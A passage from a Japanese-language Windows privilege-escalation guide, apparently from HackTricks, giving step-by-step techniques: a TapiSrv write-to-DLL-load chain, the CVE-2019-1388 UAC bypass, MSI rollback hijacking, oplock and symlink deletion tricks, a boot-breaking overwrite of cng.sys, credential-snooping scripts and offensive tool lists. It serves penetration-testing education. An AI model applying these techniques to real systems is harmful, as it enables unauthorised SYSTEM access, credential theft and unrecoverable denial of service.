また、次のツールは **burp のようなツールで named pipe の通信をインターセプトする**ことを可能にします: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこのツールは privescs を見つけるために全てのパイプを列挙・閲覧することを可能にします** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

server mode の Telephony サービス（TapiSrv）は `\\pipe\\tapsrv` (MS-TRP) を公開します。認証済みのリモートクライアントは、mailslot ベースの非同期イベント経路を悪用して `ClientAttach` を `NETWORK SERVICE` によって書き込み可能な任意の既存ファイルへの**任意の4バイト書き込み**に変え、Telephony 管理権限を取得し、サービスとして任意の DLL をロードできます。フローは以下の通りです：

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windowsで実行される可能性のあるファイル拡張子

ページは **[https://filesec.io/](https://filesec.io/)** を参照してください

### **コマンドラインのパスワード監視**

ユーザーとしてシェルを取得した際、スケジュールされたタスクや他の実行プロセスが**コマンドラインで資格情報を渡している**ことがあります。以下のスクリプトはプロセスのコマンドラインを2秒ごとに取得し、現在の状態を前回の状態と比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効になっている場合、いくつかの Microsoft Windows のバージョンでは、低権限のユーザーから "NT\AUTHORITY SYSTEM" のような terminal やその他のプロセスを実行することが可能です。

これにより、同じ脆弱性を利用して権限昇格を行い、同時に UAC をバイパスすることが可能になります。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは署名されており、Microsoft によって発行されています。

影響を受けるシステムの一部は以下の通りです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Administrator の Medium から High への Integrity Level / UAC Bypass

Integrity Levels について **学ぶためにこれを読んでください**:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypasses について **学ぶためにこれを読んでください**:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 任意のフォルダ削除/移動/名前変更から SYSTEM EoP へ

この手法は [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) が提供されています。

この攻撃は基本的に、Windows Installer の rollback 機能を悪用して、アンインストール中に正規ファイルを悪意あるものに置き換えるものです。そのために、攻撃者は `C:\Config.Msi` フォルダを乗っ取るための **malicious MSI installer** を作成する必要があり、後で Windows Installer が他の MSI パッケージのアンインストール中に rollback ファイルを保存する際に、これらの rollback ファイルが悪意あるペイロードを含むように改ざんされます。

要約すると手順は次の通りです:

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: Install the MSI
- 書き込み可能なフォルダ（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
- インストーラーを **"UAC Compliant"** とマークし、**non-admin user** が実行できるようにします。
- インストール後、そのファイルへの **handle** を保持します。

- Step 2: Begin Uninstall
- 同じ `.msi` をアンインストールします。
- アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイルにリネームして rollback バックアップを作成します。
- `GetFinalPathNameByHandle` を使って **開いているファイルハンドルをポーリング** し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **カスタムアンインストールアクション (`SyncOnRbfWritten`)** が含まれており、
- `.rbf` が書き込まれたことをシグナルします。
- その後、アンインストールを続行する前に別のイベントを待機します。

- Step 4: Block Deletion of `.rbf`
- シグナルを受けたら、`FILE_SHARE_DELETE` なしで `.rbf` ファイルを **開きます** — これによりそのファイルは **削除できなくなります**。
- その後、アンインストールを完了させるためにシグナルを返します。
- Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: Manually Delete `.rbf`
- 攻撃者が手動で `.rbf` を削除します。
- これで **`C:\Config.Msi` は空** になり、乗っ取りに備えられます。

> この時点で、`C:\Config.Msi` を削除するために **SYSTEM-level arbitrary folder delete vulnerability** をトリガーしてください。

2. **Stage 2 – Rollback スクリプトを悪意あるものに置き換える**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自分で `C:\Config.Msi` フォルダを再作成します。
- **弱い DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持つハンドルを **開いたままにしておきます**。

- Step 7: Run Another Install
- 再度 `.msi` をインストールします。条件は:
- `TARGETDIR`: 書き込み可能な場所。
- `ERROROUT`: 強制失敗を引き起こす変数。
- このインストールは再び **rollback** をトリガーするために使われ、`.rbs` と `.rbf` を読み込みます。

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
- そのファイル名をキャプチャします。

- Step 9: Sync Before Rollback
- `.msi` には **カスタムインストールアクション (`SyncBeforeRollback`)** が含まれており、
- `.rbs` が作成された際にイベントをシグナルします。
- その後、処理を続行する前に待機します。

- Step 10: Reapply Weak ACL
- `.rbs 作成` イベントを受け取った後、
- Windows Installer は `C:\Config.Msi` に強い ACL を再適用します。
- しかし、あなたはまだ `WRITE_DAC` を持つハンドルを持っているため、**弱い ACL を再適用** できます。

> ACL は **ハンドルオープン時にのみ適用される** ため、フォルダへの書き込みが可能です。

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` ファイルを上書きして、Windows に次のことを指示する **偽の rollback スクリプト** を置きます:
- あなたの `.rbf`（悪意ある DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元するよう指示。
- SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を置きます。

- Step 12: Trigger the Rollback
- 同期イベントをシグナルしてインストーラーを再開させます。
- 既知のポイントでインストールを故意に失敗させる **type 19 custom action (`ErrorOut`)** が設定されています。
- これにより **rollback が開始** されます。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer は：
- 悪意ある `.rbs` を読み、
- あなたの `.rbf` DLL をターゲット場所にコピーします。
- これで **SYSTEM がロードするパスに悪意ある DLL が配置** されます。

- Final Step: Execute SYSTEM Code
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、あなたが乗っ取った DLL をロードさせます。
- **すると**: あなたのコードが **SYSTEM として実行** されます。

### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主要な MSI rollback 手法（前述の手法）は、`C:\Config.Msi` のような **フォルダ全体を削除できる** ことを前提としています。しかし、もし脆弱性が **任意のファイル削除** のみを許す場合はどうでしょうか？

この場合、**NTFS の内部**を悪用できます: すべてのフォルダには隠しの代替データストリーム（alternate data stream）と呼ばれるものが存在します:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除すると**、NTFSは**フォルダ全体をファイルシステムから削除します**。

これは、次のような標準的なファイル削除APIを使って行えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、それは **フォルダ自体を削除します**。

### Folder Contents Delete から SYSTEM EoP へ
もしあなたのプリミティブが任意のファイル/フォルダを削除できないが、**攻撃者が制御するフォルダの *内容* を削除できる**としたらどうしますか？

1. Step 1: おとりフォルダとファイルをセットアップ
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を仕掛ける
- oplock は特権プロセスが `file1.txt` を削除しようとしたときに、**実行を一時停止させます**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、中身を削除しようとします。
- `file1.txt` に到達すると、**oplock triggers** が発生し、制御があなたのコールバックに渡されます。

4. ステップ 4: oplock コールバック内で – 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これにより `folder1` を空にできます（oplock を壊さずに）。
- `file1.txt` を直接削除しないでください — それを行うと oplock が早期に解除されます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS internal stream を対象としています — それを削除するとフォルダが削除されます。

5. ステップ 5: oplock を解放
- SYSTEM プロセスは処理を続行し、`file1.txt` を削除しようとします。
- しかし現在、junction + symlink のため、実際には次のものを削除しています:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除される。

### Arbitrary Folder Create から永続的な DoS へ

このプリミティブを悪用すると、**SYSTEM/adminとして任意のフォルダを作成できる** — たとえ **ファイルを書き込めない** または **弱い権限を設定できない** 場合でも。

**フォルダ**（ファイルではなく）を、**重要な Windows ドライバ**の名前で作成する。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- もしそれを **フォルダとして事前作成**しておくと、Windows はブート時に実際のドライバを読み込めません。
- その後、Windows はブート時に `cng.sys` を読み込もうとします。
- フォルダを見つけると、**実際のドライバを解決できず**、**クラッシュまたはブート停止**します。
- **フォールバックはなく**、外部介入（例：ブート修復やディスクアクセス）なしでは **回復できません**。

### 特権ログ/バックアップパス + OM symlinks から arbitrary file overwrite / boot DoS へ

特権を持つサービスが **書き込み可能な設定** から読み取ったパスにログ/エクスポートを書き込む場合、そのパスを **Object Manager symlinks + NTFS mount points** でリダイレクトすることで、特権書き込みを arbitrary overwrite に変えることができます（**SeCreateSymbolicLinkPrivilege** がなくても可能）。

**要件**
- ターゲットパスを保持する設定ファイルが攻撃者によって書き込み可能であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` へのマウントポイントと OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに書き込む特権操作（ログ、エクスポート、レポートなど）。

**例**
1. 設定を読み、特権ログの保存先を取得する。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでそのパスをリダイレクトする：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例：管理者が "send test SMS" をトリガー）。書き込みは現在 `C:\Windows\System32\cng.sys` に行われる。  
4. 上書きされたターゲット（hex/PE parser）を検査して破損を確認する；再起動すると Windows が改ざんされたドライバパスを読み込むため → **boot loop DoS**。これは特権を持つサービスが書き込みのために開く任意の保護されたファイルにも一般化される。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` からロードされますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合はそちらが先に試されることがあり、破損データの信頼できる DoS シンクになります。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

既に High Integrity プロセスで実行中であれば、**SYSTEM へのパス**は単に**新しいサービスを作成して実行する**だけで簡単に達成できます：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する際は、有効なサービスであるか、もしくはバイナリが必要な処理を速やかに実行するようにしてください。無効なサービスであると20秒で終了されます。

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**次のリンクでコードを確認できます** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

これらのトークン権限を持っている場合（おそらく既に High Integrity のプロセスで見つかるでしょう）、SeDebug 権限でほとんどのプロセス（protected processes を除く）を開き、そのプロセスのトークンをコピーして、そのトークンで任意のプロセスを作成できます。\
この手法では通常、**SYSTEM として実行されている任意のプロセス（全てのトークン権限を持つもの）を選択します**（_はい、全てのトークン権限を持たない SYSTEM プロセスも見つかります_）。\
**提案した手法を実行するコードの例は次で確認できます** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
名前付きパイプについて詳しく知りたい場合は [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)。\
名前付きパイプを使って high integrity から System に移行する例を読みたい場合は [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) を参照してください。

### Dll Hijacking

SYSTEM として動作しているプロセスにロードされる DLL を hijack できれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の特権昇格に有効であり、さらに High Integrity プロセスから達成する方がはるかに容易です。High Integrity プロセスは DLL をロードするフォルダに対する書き込み権限を持っているためです。\
**詳細は** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 誤設定や機密ファイルをチェックします（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出されることがあります。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な誤設定をチェックし情報を収集します（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 誤設定をチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP の保存されたセッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出されることがあります。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell 製の ADIDNS/LLMNR/mDNS スプーファーおよび中間者ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows の特権昇格向け列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の特権昇格脆弱性を検索します（Watson により非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（管理者権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の特権昇格脆弱性を検索します（VisualStudio でコンパイルする必要があります）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して誤設定を探します（privesc というより情報収集ツール）（コンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから資格情報を抽出します（GitHub 上に precompiled exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# 移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 誤設定をチェックします（実行ファイルが GitHub に precompiled）。推奨しません。Win10 ではあまりうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な誤設定をチェックします（Python からの exe）。推奨しません。Win10 ではあまりうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツールです（正常に動作するのに accesschk は不要ですが、使用することはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、利用可能なエクスプロイトを推奨します（ローカル Python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、利用可能なエクスプロイトを推奨します（ローカル Python）

**Meterpreter**

multi/recon/local_exploit_suggestor_

プロジェクトをコンパイルするには正しいバージョンの .NET を使用する必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには、次のようにします:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
